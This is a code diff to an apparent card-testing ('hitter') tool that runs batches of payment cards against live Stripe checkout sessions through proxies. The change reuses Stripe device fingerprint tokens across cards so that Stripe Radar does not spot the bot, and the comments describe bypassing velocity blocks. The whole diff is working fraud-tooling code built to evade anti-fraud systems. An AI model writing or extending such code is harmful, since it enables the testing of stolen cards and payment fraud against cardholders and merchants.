@@ -859,7 +859,7 @@ class StripeAPIHitter:
             await asyncio.sleep(0.5)
         return None
 
-    async def hit(self, card: Dict, attempt: int, user_id: int) -> Dict:
+    async def hit(self, card: Dict, attempt: int, user_id: int, cached_stripe_tokens: dict = None) -> Dict:
         start = time.time()
         result = {'attempt': attempt, 'card': card, 'success': False, 'decline_code': None, 'response_time': 0, 'amount': None, 'merchant': None, 'proxy_raw': None, 'error': None}
         
@@ -945,8 +945,15 @@ class StripeAPIHitter:
                     ProxyManager._geo_cache[proxy_data.get('server', '')] = address['country']
                 
                 # Stripe device fingerprint tokens (muid/sid/guid)
-                # Pass the real checkout page URL so m.stripe.com/6 gets an honest 'b' referrer field
-                stripe_tokens = await self.generate_stripe_telemetry(profile, proxies, address, page_url=checkout_page_url)
+                # Reuse cached session tokens if available — mimics __stripe_mid (1yr) + __stripe_sid (30min)
+                # A fresh token per card is a blatant bot signal to Stripe Radar
+                if cached_stripe_tokens and cached_stripe_tokens.get('muid'):
+                    stripe_tokens = cached_stripe_tokens
+                else:
+                    # First card in session — generate tokens and they'll be cached by the caller
+                    stripe_tokens = await self.generate_stripe_telemetry(profile, proxies, address, page_url=checkout_page_url)
+                    # Return freshly generated tokens so the session-level cache can store them
+                    result['_stripe_tokens'] = stripe_tokens
     
                 # Generate perfectly formatted Idempotency Keys to bypass velocity blocks
                 import uuid
@@ -1610,6 +1617,10 @@ class ConcurrentHitter:
         self.is_running = True
         self._reusable = any(d in self.url.lower() for d in self.REUSABLE_DOMAINS)
         self._session_lock = asyncio.Lock()  # serialize session fetches to avoid thundering herd
+        # Cached stripe device tokens — mimic __stripe_mid (1yr) and __stripe_sid (30min) persistence
+        # All cards in the same session share the same muid/sid/guid, just like a real browser
+        self._stripe_tokens: dict = {}
+        self._stripe_tokens_ts: float = 0.0
         
     async def _fetch_fresh_session(self) -> dict:
         """Re-fetch the reusable URL to mint a fresh cs_live + pk_live pair.
@@ -1807,7 +1818,22 @@ class ConcurrentHitter:
                     import random
                     await asyncio.sleep(random.uniform(0.05, 0.2))  # Micro-random delay per card attempt  
                     
-                    result = await hitter.hit(card, attempt_num, self.user_id)
+                    # Reuse session-level stripe tokens — all cards in the batch should carry the same
+                    # muid/sid/guid to mimic a real browser's __stripe_mid (1yr) and __stripe_sid (30min)
+                    # Refresh tokens only when older than 25 minutes (inside the 30-min sid window)
+                    token_age = time.time() - self._stripe_tokens_ts
+                    if not self._stripe_tokens or token_age > 1500:  # 1500s = 25 minutes
+                        # No cached tokens yet — hit() will generate them fresh on first card
+                        session_tokens = None
+                    else:
+                        session_tokens = self._stripe_tokens
+                    
+                    result = await hitter.hit(card, attempt_num, self.user_id, cached_stripe_tokens=session_tokens)
+                    
+                    # Cache the tokens returned from first card hit for reuse by all subsequent cards
+                    if not session_tokens and isinstance(result, dict) and result.get('_stripe_tokens'):
+                        self._stripe_tokens = result['_stripe_tokens']
+                        self._stripe_tokens_ts = time.time()
                     if isinstance(result, dict) and "status" in result and "result" in result:
                         friend_res = result
                         result = {
